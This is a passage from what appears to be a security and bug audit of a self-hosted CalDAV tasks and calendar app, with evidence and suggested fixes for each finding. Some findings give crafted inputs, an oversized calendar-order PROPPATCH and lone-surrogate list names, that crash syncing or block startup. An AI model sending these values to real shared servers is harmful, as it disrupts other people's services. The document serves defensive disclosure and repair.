split_series tests for all three shapes (floating EXDATE on an aware master, aware
EXDATE on a floating master, floating RECURRENCE-ID override on an aware master)
asserting a clean split rather than a raise.

#### [x] _reconcile_overrides builds a dateutil probe with a naive DTSTART but a UTC UNTIL, so changing "Repeat until" on a series with one mismatched override is permanently rejected

`backend/tasksd/ical/edit.py:393` · **medium** · bug · `minor`

`_generated` re-anchors the membership probe per override precisely because "dateutil
needs both ends of the probe to agree on tz-awareness" (edit.py:389-392) — `_comparable`
strips the zone off *both* `dtstart` and the override's RECURRENCE-ID when they
disagree. But the rule string handed to `rrulestr` is not normalized with them. When the
user's new repeat carries an UNTIL, `_set_rrule`/`_coerce_until` has already written it
as a UTC (aware) instant against the master's aware DTSTART, so the probe becomes
`rrule(dtstart=<naive>, until=<aware>)` and dateutil raises ValueError at rrule.py:470.
`apply_event_changes` -> `patch_event` maps ValueError to 422, so the owner gets a
cryptic "RRULE UNTIL values must be specified in UTC when DTSTART is timezone-aware" and
the repeat change is impossible for as long as that override exists — while the
identical edit with a COUNT-bounded or unbounded rule succeeds. Trigger: a zone-anchored
series (TZID master) that a foreign client, or an older write of ours, gave an override
with a floating RECURRENCE-ID — exactly the situation the function's own comment
describes.

<details><summary>Evidence</summary>

```
edit.py:384-394:

        start, at = _comparable(dtstart.dt, anchor)      # both stripped to naive
        rr = rrulestr(vRecur(rule).to_ical().decode(), dtstart=start)   # rule still carries UNTIL=...Z
        return bool(rr.between(at, at, inc=True))

Probe (pinned deps): master `DTSTART;TZID=America/Chicago:20260106T090000`, `RRULE:FREQ=WEEKLY;COUNT=6`, plus one override with a floating `RECURRENCE-ID:20260113T090000` / `DTSTART:20260113T100000`.

  apply_event_changes(raw, EventEdit(rrule=rrule_from_spec('daily', until=date(2026,2,1))))
    File edit.py:450, in apply_event_changes -> _reconcile_overrides(cal, event)
    File edit.py:401, in <listcomp>        -> _generated(c.get("RECURRENCE-ID").dt)
    File edit.py:393, in _generated        -> rrulestr(vRecur(rule).to_ical().decode(), dtstart=start)
    File dateutil/rrule.py:470, in __init__
  ValueError: RRULE UNTIL values must be specified in UTC when DTSTART is timezone-aware

The same input with `rrule_from_spec('monthly')` (no UNTIL) succeeds and returns a correct resource, which is what pins the cause on the un-normalized UNTIL rather than on the override itself. User-visible: event modal -> Repeat: daily, Repeat until 2026-02-01 -> "All events" -> 422 with dateutil's internal message, every time.
```

</details>

**Suggested fix.** Normalize the probe rule alongside the probe endpoints. In `_generated`, after `start,
at = _comparable(dtstart.dt, anchor)`, build a probe copy of the rule whose UNTIL
awareness matches `start` — e.g. `probe = dict(rule); if rule.get('UNTIL') and
start.tzinfo is None: probe['UNTIL'] = [u.replace(tzinfo=None) if isinstance(u,
datetime) else u for u in rule['UNTIL']]` — and pass `vRecur(probe)` to `rrulestr`. (The
probe is throwaway; the rule actually written to the master is untouched.) Add a test:
aware master + floating-RECURRENCE-ID override + `rrule_from_spec('weekly', until=...)`
reconciles instead of raising.

#### [x] split_series drops a RANGE=THISANDFUTURE override that starts before the split point, so every occurrence in the tail silently reverts to the master

`backend/tasksd/ical/edit.py:932` · **medium** · bug

`_drop_overrides(tail, anchor, keep_before=False)` removes every override component
whose RECURRENCE-ID is before the anchor. For a single-slot override that is right — it
belongs to the head. For a `RECURRENCE-ID;RANGE=THISANDFUTURE` override (RFC 5545
§3.2.13, written by Apple Calendar and Thunderbird for "this and all future events"; the
repo supports the shape explicitly, see `recur._thisandfuture_shifts` and
`_keep_params`' docstring at edit.py:640-643) that one component also carries the times,
summary, location, alarms and everything else for every occurrence *after* it —
including all of the tail. Dropping it makes the whole tail snap back to the master's
values, and because the tail is written as a brand-new resource with a fresh UID the
loss is permanent. This is the same invariant-#2 loss the filed `exclude_occurrence`
finding describes, on the other override-pruning path (`_drop_overrides`,
edit.py:840-850), which that fix does not touch. There is no test:
`test_shift_series_preserves_recurrence_id_parameters` covers `shift_series` only, and
no split test uses a THISANDFUTURE override.

<details><summary>Evidence</summary>

```
edit.py:932: `_drop_overrides(tail, anchor, keep_before=False)` -> edit.py:846: `after = _at_or_after(rid.dt, anchor); if (keep_before and after) or (not keep_before and not after): continue`.

Probe with the repo's own `foreign_event_raw` — weekly 09:00Z x4, Apple-style TF override at 1/13 moving 1/13, 1/20 and 1/27 to 10:00 with SUMMARY:TF and LOCATION:Room B:

  BEFORE (recurrence_id, start, summary, location):
    2026-01-06T09:00:00+00:00  09:00  Std  None
    2026-01-13T09:00:00+00:00  10:00  TF   Room B
    2026-01-20T09:00:00+00:00  10:00  TF   Room B
    2026-01-27T09:00:00+00:00  10:00  TF   Room B

  split_series(raw, '2026-01-20T09:00:00+00:00', EventEdit())     # "this and following", no time change
  HEAD: 1/6 09:00 Std, 1/13 10:00 TF Room B        (correct)
  TAIL: 2026-01-20T09:00:00+00:00 Std None
        2026-01-27T09:00:00+00:00 Std None          <- were 10:00 'TF' / Room B

  Serialized tail contains no RECURRENCE-ID at all:
    DTSTART:20260120T090000Z / RRULE:FREQ=WEEKLY;COUNT=2 / SUMMARY:Std

Reachability: the MCP tool exposes the scope directly (mcp/api.py:368-404 builds `EventEdit(**kw)` from only the fields supplied), so `smylte_update_event(uid, summary='...', recurrence_id='2026-01-20T09:00:00+00:00', scope='thisandfuture')` reproduces the run above verbatim — time, location and every non-supplied field of the tail revert. From the SPA the visible fields happen to be resent (CalendarView.tsx:711-713 sends summary/location/description/tags plus the displayed start/end), so what is lost there is everything the modal does not carry: the override's VALARM reminders, ATTENDEE/ORGANIZER, STATUS and X- properties.
```

</details>

**Suggested fix.** Treat a THISANDFUTURE override as covering the tail rather than as belonging to the
head. In `_drop_overrides`, when `keep_before=False` and the RECURRENCE-ID carries
`RANGE=THISANDFUTURE` and its slot is before the anchor, keep the component in the tail
(re-anchoring its RECURRENCE-ID to the tail's own DTSTART so it still covers from the
tail's first slot on); the head keeps its copy as it does today. Add a split test with
the repo's `_thisandfuture_series()` fixture asserting the tail's occurrences keep the
override's start, summary and location.

### iCalendar read + CalDAV client

#### [x] A foreign client's calendar-order property crashes discover() with OverflowError — all sync stops permanently and the app refuses to restart

`backend/tasksd/dav/client.py:155` · **high** · bug · `minor`

`list_collections` parses the Apple `calendar-order` dead property with
`int(order_text)` guarded only by `except ValueError`. Python ints are arbitrary
precision, so a value like `99999999999999999999999` parses fine, lands in
`CollectionInfo.order`, and is then bound straight into SQLite's `collections.ord`
column by `store.upsert_collection` (store.py:48-61), where sqlite3 raises
`OverflowError` — which is NOT a `ValueError`, is not in the DAV error taxonomy, and
matches none of the seven handlers registered in app.py. `calendar-order` is a standard
property any CalDAV client sharing the collection can PROPPATCH (adversary #3 in the
trust model); no special privilege is needed and Radicale stores dead properties
verbatim without validating them. `SyncEngine.discover()` is where this lands, and
discover() is the *first* thing on three critical paths: `TaskService.bootstrap()`
(service.py:105-107, no try/except) which runs inside the FastAPI lifespan (app.py:720)
— so the process fails to start; `TaskService.sync_all()` (service.py:114-115) where the
discover() call sits OUTSIDE the per-collection `try/except`, so the whole sweep aborts
on every poll and the cache for every list and calendar freezes silently (the only
signal is one `log.warning` per interval from `_sync_loop`); and `update_collection()`
(service.py:333), where it becomes a 500 on any rename/recolor. The `_tx` wrapper rolls
back, so nothing is persisted and the failure reproduces on every single pass until
another client removes the property. This is the same unbounded-int class the audit
already fixed twice for owner-supplied API fields (`sort_order`, `estimated_minutes`) —
but here the input comes off the untrusted wire.

<details><summary>Evidence</summary>

```
Code (client.py:151-160):

    name = r.text(X.DISPLAYNAME) or r.href.rstrip("/").rsplit("/", 1)[-1]
    color = (r.text(X.CALENDAR_COLOR) or "").strip() or None
    order_text = (r.text(X.CALENDAR_ORDER) or "").strip()
    try:
        order = int(order_text) if order_text else None
    except ValueError:
        order = None
    out.append(CollectionInfo(href=r.href, displayname=name, components=comps, color=color, order=order))

Reproduced end-to-end against a real Radicale 3.7.8 (the deploy targets 3.7.4), with the repo's own DavClient/SyncEngine:

  # any CalDAV client, one PROPPATCH, no auth beyond the shared Radicale creds:
  PROPPATCH /u/cal/  <I:calendar-order>99999999999999999999999</I:calendar-order>
    -> 207 (accepted and stored)

  >>> DavClient("http://127.0.0.1:5299/u/", "u", "").list_collections()
  [CollectionInfo(href='/u/cal/', displayname='Cal', components={'VTODO','VEVENT','VJOURNAL'},
                  color=None, order=99999999999999999999999)]

  >>> SyncEngine(dav, conn).discover()
  OverflowError: Python int too large to convert to SQLite INTEGER
    at store.upsert_collection -> conn.execute(INSERT INTO collections ... ord ...)

  >>> SyncEngine(dav, conn).sync("/u/cal/")
  SYNC RAISED OverflowError: Python int too large to convert to SQLite INTEGER
  cached items: []          # nothing syncs, ever

Any value outside [-2**63, 2**63-1] does it; so does any negative one that large.
```

</details>

**Suggested fix.** Bound the parsed value to what SQLite can hold before it leaves the parser, e.g. after
the existing try/except add `if order is not None and not (-2**63 <= order < 2**63):
order = None` (a tighter sanity bound such as +/-1_000_000 is just as correct — the
property is only a client sort hint). Add a unit test that feeds `list_collections` a
multistatus whose `<calendar-order>` is `"9"*23` and asserts the collection still
upserts with `order=None`, and — separately — wrap `bootstrap()`/`sync_all()`'s
`discover()` so an unexpected exception from one property cannot abort startup.

#### [x] Test gap: parse_multistatus and the whole PROPFIND/REPORT response-parsing path — the only code turning untrusted wire XML into app state — has no unit coverage

`backend/tasksd/dav/xml.py:198` · **medium** · test-gap

`parse_multistatus` and its consumers (`list_collections`, `sync_collection`,
`multiget`, `proppatch`'s propstat check) are the boundary where bytes written by other
CalDAV clients become CollectionInfo/Item/SyncResult objects and then SQLite rows.
Nothing in `backend/tests/` builds a multistatus document: every sync/service test uses
a `_FakeDav` that hands back already-constructed `CollectionInfo`/`Item`/`SyncResult`
(tests/test_sync_unit.py:23, test_service_unit.py:15, test_recur.py:17,
test_store_unit.py:10), so xml.py's parser is bypassed entirely. The only code that
touches it lives behind `@pytest.mark.radicale`, which conftest.py skips whenever the
scratch server on :5233 is not running (CI and any fresh checkout), and even those tests
only ever see well-formed Radicale output for values the app itself wrote. As a result
none of the following is pinned anywhere: an out-of-range `calendar-order` (the
confirmed OverflowError above), a `<displayname>` that is absent or empty (the href-
derived fallback at client.py:151), a `calendar-color` of arbitrary shape, `is_removed`
detection at both the response and propstat level, the rule that a property is only
honoured from a 2xx propstat, a missing `<sync-token>`, or a body that is not well-
formed XML at all (which raises `XMLSyntaxError` — not a `DavError` — straight out of
`parse_multistatus`, mapping to a 500 rather than the 502 the DAV taxonomy promises).
Because the parser also relies entirely on lxml's *default* parser settings for entity
and size safety, and requirements.txt pins only `lxml>=5.0`, a dependency bump could
change that behaviour with nothing in the suite able to notice.

<details><summary>Evidence</summary>

```
`grep -rn "parse_multistatus\|build_propfind\|build_calendar_multiget" backend/tests/*.py` returns nothing; the only xml.py reference in the whole suite is `X.build_proppatch` at tests/test_security.py:440-449 (the control-character guard). `tests/conftest.py:29-35` skips every DavClient-backed test when :5233 is unreachable.

That the gap is load-bearing, not theoretical: a single PROPPATCH of `<calendar-order>99999999999999999999999</calendar-order>` from any client sharing the collection makes `list_collections` return `order=99999999999999999999999` and `SyncEngine.discover()` raise `OverflowError` (reproduced against Radicale 3.7.8 in the finding above) — a defect that lives entirely inside the untested function, aborts `bootstrap()` at app.py:720, and the full suite stays green.

Also unverified: `parse_multistatus(b"")` / `parse_multistatus(b"<html>...")` raises `lxml.etree.XMLSyntaxError`, which none of app.py's seven registered handlers catch.
```

</details>

**Suggested fix.** Add a `tests/test_dav_xml.py` that drives `X.parse_multistatus` and `DavClient` (with a
`httpx.MockTransport`) off literal multistatus bytes, covering at minimum: an out-of-
int64 and a non-numeric `calendar-order` (assert `order is None`, not a raise); a
response with no `<displayname>` (assert the href fallback); a propstat 404 and a
response-level 404 (assert `is_removed`); a property present only in a non-2xx propstat
(assert `prop()` returns None); a sync-collection body with no `<sync-token>` (assert
`DavError`); and a body that is not well-formed XML (assert whatever the chosen contract
is — preferably a `DavError`, which requires wrapping `etree.fromstring` in xml.py:199).
While there, construct the parser explicitly (`etree.XMLParser(resolve_entities=False,
no_network=True, huge_tree=False)`) so the entity/size posture is pinned by the code
rather than by whichever lxml `>=5.0` happens to be installed.

#### [x] The XML-safety backstop added for control characters misses lone surrogates and U+FFFE/U+FFFF, so a list name still turns into an unhandled 500

`backend/tasksd/dav/xml.py:127` · **low** · bug · `minor`

`_text` (xml.py:121-129) exists specifically so that no caller can turn a stray byte
into an unhandled crash inside the DAV client, and `CollectionName` (app.py:71-74)
mirrors its regex as a 422 at the edge. Both use the same character class
`[\x00-\x08\x0b\x0c\x0e-\x1f]`, which is incomplete: lxml also refuses the Unicode
noncharacters U+FFFE/U+FFFF at `.text` assignment (bare `ValueError`), and
`etree.tostring(..., encoding="utf-8")` raises `UnicodeEncodeError` on a lone surrogate,
which JSON transports happily (`json.loads('"\\ud800"')` yields it, and both
`Request.json()` and the MCP tool surface use stdlib json). Neither `ValueError` nor
`UnicodeEncodeError` is a `DavError`, and app.py registers handlers only for
RequestValidationError, ConflictError, SlotTaken, KeyError, DavNotFound, DavAuthError
and DavError — so the exception escapes as a 500 with a traceback, exactly the failure
the guard was written to close. The same holds for `color`, whose API models carry no
pattern at all.

<details><summary>Evidence</summary>

```
Verified directly against the repo's builder:

    >>> from tasksd.dav import xml as X
    >>> X.build_proppatch({X.DISPLAYNAME: json.loads('"\\ud800"')})
    UnicodeEncodeError: 'utf-8' codec can't encode character '\ud800' in position 0: surrogates not allowed
    >>> X.build_proppatch({X.DISPLAYNAME: "a\uffffb"})
    ValueError: All strings must be XML compatible: Unicode or ASCII, no NULL bytes or control characters
    >>> X.build_proppatch({X.DISPLAYNAME: "a\x7fb"})      # DEL is fine
    OK

Both values pass `CollectionName`'s pattern `^[^\x00-\x08\x0b\x0c\x0e-\x1f]*$`, so the 422 never fires. Path: `PATCH /api/lists/{id}` (or `POST /api/lists`, or MCP `smylte_update_list`) with `{"name": "Work\ud800"}` -> `patch_list` -> `TaskService.update_collection` (service.py:324-332) -> `DavClient.proppatch` -> `X.build_proppatch` -> `_text` passes -> raise. No handler matches -> HTTP 500 + traceback. `build_mkcalendar` is the same shape on the create path.

The existing regression test (`test_the_xml_builders_refuse_what_lxml_cannot_serialize`, tests/test_security.py:437-449) only tries `a\x00b`, `a\x0bb`, `a\x1fb`, so the suite is green.
```

</details>

**Suggested fix.** Make the backstop match what lxml actually accepts rather than an approximation: in
`_text`, reject any character with `ord(c) < 0x20 and c not in '\t\n\r'`, any surrogate
`0xD800 <= ord(c) <= 0xDFFF`, and the noncharacters (`0xFFFE`/`0xFFFF` and the
`U+xFFFE/U+xFFFF` plane endings), raising `DavError` as it already does. Cheapest
equivalent: attempt `value.encode('utf-8')` and catch `UnicodeEncodeError`, plus extend
the regex with `[\ud800-\udfff\ufffe\uffff]`. Mirror the same class into `CollectionName` so the
client gets a 422, and add the surrogate/U+FFFF cases to tests/test_security.py:443.

### Sync engine + cache

#### [x] An unbounded calendar-order read off the wire overflows the INTEGER bind in upsert_collection, and because discover() wraps every collection in one transaction it permanently stops all discovery and sync — and stops the app booting at all

`backend/tasksd/db/store.py:60` · **high** · bug

`store.upsert_collection` binds `ci.order` into `collections.ord` (declared INTEGER)
with no bound. That value comes straight off the wire: `DavClient.list_collections` does
`order = int(order_text)` on the apple `calendar-order` property
(dav/client.py:153-156), and Python ints are arbitrary precision, so any value past
2^63-1 makes sqlite3 raise `OverflowError` at bind time. `OverflowError` is not
`ValueError` and nothing catches it.
The blast radius comes from `SyncEngine.discover()` (engine.py:86-95), which upserts
every collection inside a single `with _tx(self.conn)`. One bad collection therefore
rolls back the whole enumeration — not just its own row — and every caller of
`discover()` fails: `bootstrap()` (service.py:103-107, called unguarded from the
lifespan at app.py:719 `await asyncio.to_thread(svc.bootstrap)`) so the process refuses
to start; `sync_all()` (service.py:113-115) which calls `discover()` first, so no
collection is ever synced afterwards; and `_create_collection`, `update_collection`,
`reorder_collections`, `delete_collection`, and `POST /api/sync`, all of which call it.
Per the trust model, other CalDAV clients sharing the Radicale collections are equal-
rights writers and everything they set — including collection properties — is untrusted.
A single PROPPATCH of `<apple:calendar-order>` bricks the app persistently: it is stored
on the server, so it survives every restart. `collections.ord` is the only wire-derived
numeric bind in store.py that is not already clamped upstream (PRIORITY / PERCENT-
COMPLETE / SEQUENCE all go through icalendar 7.2.2, which enforces the RFC 5545 int32
range during extraction and so surfaces as a ValueError that `_upsert_body` already
catches).

<details><summary>Evidence</summary>

```
store.py:48-61 — the bind:

    conn.execute(
        """INSERT INTO collections (href, displayname, components, color, ord, deleted, updated_at)
           VALUES (?, ?, ?, ?, ?, 0, strftime(...))
           ON CONFLICT(href) DO UPDATE SET ... ord=excluded.ord, ...""",
        (ci.href, ci.displayname, ",".join(sorted(ci.components)) or "VTODO",
         ci.color, ci.order),          # <- unbounded int from the wire
    )

dav/client.py:153-156 — where it comes from:

    order_text = (r.text(X.CALENDAR_ORDER) or "").strip()
    try:
        order = int(order_text) if order_text else None   # no magnitude bound
    except ValueError:
        order = None

Measured against the real schema (pinned deps):

    store.upsert_collection(conn, CollectionInfo(href='/u/a/', displayname='Cal',
                                                 components={'VTODO'}, order=10**25))
    -> OverflowError: Python int too large to convert to SQLite INTEGER

And through the engine, with a stub DAV serving TWO collections where only the second is poisoned
(/u/work/ order=0, /u/shared/ order=10**25):

    eng.discover()
      discover RAISED: OverflowError Python int too large to convert to SQLite INTEGER
      collections cached: []            # the GOOD collection was rolled back too
      in_transaction: False
    eng.discover()                      # retry
      discover again RAISED: OverflowError ...    # deterministic, every pass

Failure scenario: the owner's phone (DAVx5/Tasks.org) or any script with the Radicale credentials
PROPPATCHes calendar-order=99999999999999999999999 onto one shared collection.
  * Running instance: `_sync_loop` (app.py:619-624) catches the Exception and logs
    "sync loop error: Python int too large to convert to SQLite INTEGER" every poll. `discover()`
    is the first call in `sync_all`, so NO collection syncs again — the SPA serves an
    increasingly stale cache with no error surfaced. Creating, renaming, recoloring, reordering
    or deleting a list all 500 as well (each calls discover()).
  * Next restart: `await asyncio.to_thread(svc.bootstrap)` (app.py:719) is unguarded, the
    OverflowError escapes the lifespan, and uvicorn reports startup failure and exits. The app
    will not boot until the property is removed from the server.
  * Fresh deploy against a store that already has the value: `collections` stays empty forever —
    an empty sidebar with no explanation.

No test covers `CollectionInfo.order` at all: `grep -rn 'order=' backend/tests/*.py` matches only
`sort_order` in two sidecar calls.
```

</details>

**Suggested fix.** Clamp the value where it enters, and stop one collection poisoning the enumeration. In
`dav/client.py`, reject or clamp an out-of-range order (`if not -2**31 <= order < 2**31:
order = None`), and defensively coerce in `store.upsert_collection` too. Independently,
give `SyncEngine.discover()` per-collection tolerance — wrap each
`store.upsert_collection(...)` in try/except so a single unusable collection is logged
and skipped rather than aborting the transaction for all of them. Add a unit test
driving `discover()` with a stub whose `list_collections` returns one good and one
`order=10**25` collection, asserting the good one is cached and no exception escapes.

#### [x] reorder_tasks' `with self._conn:` opens no transaction (isolation_level=None), so set_sort_orders' documented all-or-nothing guarantee does not exist and 20 000 rows are written as 20 000 separate commits under the global lock

`backend/tasksd/service.py:403` · **medium** · bug · `minor`

`store.connect` opens the connection with `isolation_level=None` (store.py:28), which
puts Python's sqlite3 driver in autocommit mode: it never issues an implicit `BEGIN`, so
`with conn:` has no transaction to commit or roll back — both are no-ops.
`TaskService.reorder_tasks` (service.py:402-404) relies on exactly that construct, and
`store.set_sort_orders`' docstring states the contract it is supposed to provide: "One
statement per row inside the caller's transaction, so a reorder is all or nothing — a
partial write would leave two tasks sharing a position and the order would depend on
whatever broke the tie." That is the one failure mode the design set out to prevent, and
it is unguarded: each of the N `INSERT ... ON CONFLICT` statements commits on its own,
so any mid-loop failure (SQLITE_FULL on a self-hosted box, an I/O error, a process
restart/SIGTERM during the write) leaves the first k tasks renumbered 1..k while the
remaining N-k keep their previous 1..M positions — duplicates across the sequence, with
the tie broken by the fallback due/summary sort.
The same dead `with conn:` appears twice more in store.py, where the docstrings likewise
claim atomicity: `take_oauth_code` ("read it and delete it in one transaction",
store.py:750) and `use_refresh_token` (store.py:801). Those two happen to stay correct
because the single-use property is carried by the atomicity of the individual
DELETE/conditional-UPDATE and because every OAuth call is serialised behind
`TaskService.oauth`'s lock — but the stated invariant is not the one the code
implements, so a future change that adds a second statement inside either block silently
loses it.
Secondary cost: `_MAX_REORDER_TASKS = 20_000` (app.py:95), and the engine's own `_tx`
helper shows the intended pattern. 20 000 autocommits measured at 1.10 s (first pass) /
0.50 s (steady state) versus 0.106 s inside a real `BEGIN IMMEDIATE` — a ~5-10x stall of
every other request, since the whole call is inside `TaskService._lock`.

<details><summary>Evidence</summary>

```
service.py:402-404:

    with self._lock:
        with self._conn:                       # <- no transaction is started
            store.set_sort_orders(self._conn, placed)

store.py:25-34 — why:

    conn = sqlite3.connect(db_path, isolation_level=None, check_same_thread=False)

Measured against the real `store.connect` + `init_db` (pinned Python 3.11 sqlite3):

    in_transaction before:            False
    with conn:
        conn.execute("INSERT INTO sidecar ... ('/a/','u1',1.0)")
        in_transaction inside block:  False        # nothing to commit or roll back

    try:
        with conn:
            conn.execute("INSERT INTO sidecar ... ('/a/','u2',2.0)")
            raise RuntimeError('boom')
    except RuntimeError: pass
    rows after the block that raised: [('/a/','u1',1.0), ('/a/','u2',2.0)]
                                       # ^ the 'rolled back' row is committed

Cost, 20 000 pairs (the route's own cap):

    autocommit (today):        1.096 s   (0.499 s warm)
    inside BEGIN IMMEDIATE:    0.106 s

Failure scenario: an account with ~2 000 tasks; the user drags one row, so the SPA POSTs the whole
sequence. The disk fills (or the container is restarted) after 800 rows have committed. Tasks
1..800 now hold positions 1..800 while tasks 801..2000 still hold their previous 1..1200, so
`list_tasks`' `dtos.sort(key=lambda d: (d["sort_order"] is None, d["sort_order"] or 0.0, ...))`
interleaves the two runs arbitrarily — exactly the "two tasks sharing a position" state the
docstring says cannot happen. The sidecar is the one table no resync can rebuild, so nothing
restores the previous order.

Test gap: `test_task_manual_reorder` / `test_task_reorder_rejects_a_bad_body` (test_api.py:835-889)
cover the happy path, an unknown list, a duplicated uid and an empty body — nothing asserts
atomicity, and `set_sort_orders` has no test in test_store_unit.py at all.
```

</details>

**Suggested fix.** Use a real transaction. Either open one explicitly in `reorder_tasks` (reuse
`tasksd.sync.engine._tx`, or `self._conn.execute("BEGIN IMMEDIATE")` / `COMMIT` with a
rollback on failure), or have `set_sort_orders` own its transaction. Fix the two OAuth
sites the same way so their docstrings become true. Add a store-level test that injects
a failure partway through `set_sort_orders` and asserts no `sort_order` changed.

### Frontend core

#### [x] The events staleness guard is global, not per window: a superseded month is dropped but still recorded as fetched, so navigating back to it renders an empty (or stale) grid forever

`frontend/src/data.tsx:533` · **medium** · bug · `minor`

CalendarProvider.fetchWindow stamps every fetch off a single `gen` counter
(data.tsx:523) and refuses to commit any response whose stamp is not the newest
(data.tsx:533) — even when that response is for a *different* window than the one that
superseded it. Meanwhile `requestWindow` has already recorded the window in `asked`
(data.tsx:549) and short-circuits any later request for it while `rev` and the calendar
set are unchanged (data.tsx:548). So a window whose response was discarded is
permanently marked "already fetched" with nothing in `windows`. `eventsFor` then falls
back to `seeded` — the disk mirror, which is either empty (fresh browser → blank month)
or last session's rows (returning browser → silently stale month, including events
deleted since). Nothing re-requests it: only an SSE data event (which changes the
`asked` stamp via `rev`), archiving/unarchiving a calendar, or an explicit `reload` (an
event edit) recovers.

<details><summary>Evidence</summary>

```
data.tsx:523-551
  const gen = useRef(0)
  const fetchWindow = useCallback((from, to, forCals) => {
    const key = windowKey(from, to)
    const mine = ++gen.current                 // <- one counter for ALL windows
    void guard(async () => {
      const per = await Promise.all(forCals.map((c) => api.events(c.id, from, to)))
      if (gen.current !== mine) return          // <- drops a *different* window's rows
      setWindows((w) => new Map(w).set(key, rows))
    })
  }, [guard])
  const requestWindow = useCallback((from, to, forCals) => {
    ...
    if (asked.current.get(key) === stamp) return   // <- but it WAS asked, so never retried
    asked.current.set(key, stamp)
    fetchWindow(from, to, forCals)
  }, [rev, enabled, fetchWindow])

Proven against the real modules (copy of the existing CalendarView harness, TZ=America/New_York, system time 2026-03-05):

  1. mount on March -> requestWindow(March), asked[March] set, fetch gen=1 (held open)
  2. click '>' to April -> fetch gen=2, resolves [april]; 'April event' renders
  3. March's batch finally settles with [march] -> gen.current(2) !== mine(1) -> dropped
  4. click '<' back to March -> asked.get(March) === stamp -> NO third request

  stdout: events() call count: 2
  FAIL: expect(screen.queryByText('March event')).toBeInTheDocument()
        received: null      // March renders as an empty grid

The existing test (CalendarView.test.tsx:255 'ignores an older fetch that settles after a newer one') asserts step 3 and stops there, so the over-correction in step 4 is untested.
```

</details>

**Suggested fix.** Make the generation per window instead of global: `const gen = useRef(new Map<string,
number>())`, then in fetchWindow `const mine = (gen.current.get(key) ?? 0) + 1;
gen.current.set(key, mine)` and commit only `if (gen.current.get(key) === mine)`. A
newer fetch for the same window still wins; a different window's response is no longer
collateral. (Belt-and-braces: `asked.current.delete(key)` when a response is dropped.)
Add the test above — forward, back, and assert a third `api.events` call plus the March
event on screen.

#### [x] A failed drag-reorder rolls back a whole-array snapshot, discarding any write that landed while it was in flight

`frontend/src/data.tsx:465` · **low** · bug · `minor`

`reorder` captures the render-time `tasks` array as `rollback` (data.tsx:459) and, when
the POST fails, replaces the entire state with it (data.tsx:465). That is precisely what
the module's own contract forbids five lines earlier: "Rollbacks restore only the
affected task — never a whole-array snapshot, which would clobber interleaved changes to
other tasks" (data.tsx:206-208). Every other write path obeys it (`settle` maps one
uid). Because a reorder POSTs every task on the account and Radicale is the slow
dependency, the in-flight window is long enough for the user to tick or edit another
row, and the reorder's own failure then silently reverts that row's *settled server
DTO*, not just an optimistic paint.

<details><summary>Evidence</summary>

```
data.tsx:457-466
    const next = placed.map((t, i) => ({ ...t, sort_order: i + 1 }))
    invalidateFetches()
    const rollback = tasks               // <- snapshot of the whole array
    setTasks(next)
    const ok = await guard(() =>
      api.reorderTasks(placed.map((t) => ({ list: t.list, uid: t.uid }))))
    if (ok === undefined) setTasks(rollback)   // <- clobbers everything since

Scenario (all optimistic writes are enabled simultaneously by design):
  t=0ms    user drags Charlie above Alpha -> setTasks(next); POST /api/tasks/reorder issued
  t=300ms  user ticks Bravo -> patchLocal(bravo, completed) -> POST .../complete -> 200
  t=500ms  settle() writes the server DTO for Bravo (completed: true) into state
  t=600ms  Bravo's SSE task_updated -> rev bump -> refetch commits (token matches)
  t=2s     the reorder POST fails (502 through the tunnel / Radicale 5xx)
           -> setTasks(rollback): Bravo is un-ticked on screen although the server
              has it COMPLETED, and no further SSE event is coming to correct it.
Same shape drops a task created during the window and resurrects one deleted during it.
TasksView.test.tsx:1276 ('puts the old order back when the write fails') has no
concurrent second write, so the suite is green.
```

</details>

**Suggested fix.** Roll back only the key the reorder owns: capture `const before = new Map(tasks.map((t)
=> [t.uid, t.sort_order] as const))` before the paint, and on failure `setTasks((ts) =>
ts.map((t) => (before.has(t.uid) ? { ...t, sort_order: before.get(t.uid)! } : t)))`. Add
a test that ticks a second task while `api.reorderTasks` is pending, then rejects it,
and asserts the tick survives.

### Tasks / Calendar / Home views

#### [x] Drop indicator draws above the target row, but a downward drag inserts below it

`frontend/src/components/TasksView.tsx:518` · **medium** · rendering

The new list-view drag-to-reorder highlights the drop target with `.task-drag.drag-over
> .task { box-shadow: inset 0 2px 0 var(--accent) }` (app.css:242) — a 2px band along
the row's TOP edge, i.e. "the row will land here, above this one". The drop arithmetic
in `reorder` (data.tsx:442-452) reads the target index BEFORE splicing the dragged row
out, so when the dragged row sits above the target the removal shifts everything up by
one and the row is re-inserted AFTER the target. Every downward drag therefore lands one
slot below where the indicator promised. The upward direction is correct, which is why
the existing tests (which assert order, never the indicator) stay green.

<details><summary>Evidence</summary>

```
TasksView.tsx:516-519
  className={drag
    ? `task-drag ${drag.over === task.uid && drag.uid !== task.uid ? 'drag-over' : ''}`
    : undefined}
app.css:242  .task-drag.drag-over > .task { box-shadow: inset 0 2px 0 var(--accent); }   // top edge only
data.tsx:445-452
  const from = placed.findIndex((t) => t.uid === uid)
  const to = placed.findIndex((t) => t.uid === target)   // read before the removal
  const [moved] = placed.splice(from, 1)
  placed.splice(to, 0, moved)

State: rows Alpha, Bravo, Charlie (in that order). Drag Alpha and hover Bravo — the accent line paints on Bravo's TOP edge, i.e. between Alpha and Bravo, which is where Alpha already is, so the gesture reads as a no-op. Drop -> from=0, to=1; after splice the order is Bravo, Alpha, Charlie: Alpha moved DOWN one, past the line it was shown against. The repo's own test `takes a task's subtasks with it` (TasksView.test.tsx:1287) does `dragOnto('Alpha','Charlie')` and asserts ['Bravo','Charlie','Alpha'] — Alpha below Charlie — while the indicator was drawn above Charlie.
```

</details>

**Suggested fix.** Make the indicator direction-aware: compute whether the dragged row is above or below
the target (both uids are already in `drag`) and apply a `drag-over-below` class that
paints `inset 0 -2px 0` instead, so the line always sits on the edge the row will
actually land on. The sidebar's list drag (`.side-item.drag-over`, app.css:89) shares
the same top-edge-only indicator with the same after-the-target semantics and wants the
same treatment.

#### [x] One drag assigns a manual position to every task on the account, so every task created afterwards sorts to the very bottom of every view

`frontend/src/data.tsx:457` · **medium** · bug

`reorder` renumbers the WHOLE account 1..N (`placed.map((t, i) => ({ ...t, sort_order: i
+ 1 }))`, mirrored server-side by `set_sort_orders`, which inserts a sidecar row for
every task). `compareTasks` consults `sort_order` first with nulls last (order.ts). A
task created after that drag has `sort_order: null` (draftTask sets it null and the
server never assigns one on create — backend/tests/test_api.py:879), so it sorts below
every pre-existing task in every surface that uses `sortTasks`: the list view, the day
columns, the calendar's day cells, and the Home modules. order.ts's rationale for nulls-
last ("the permanent, ordinary case for anything the user has not placed by hand") only
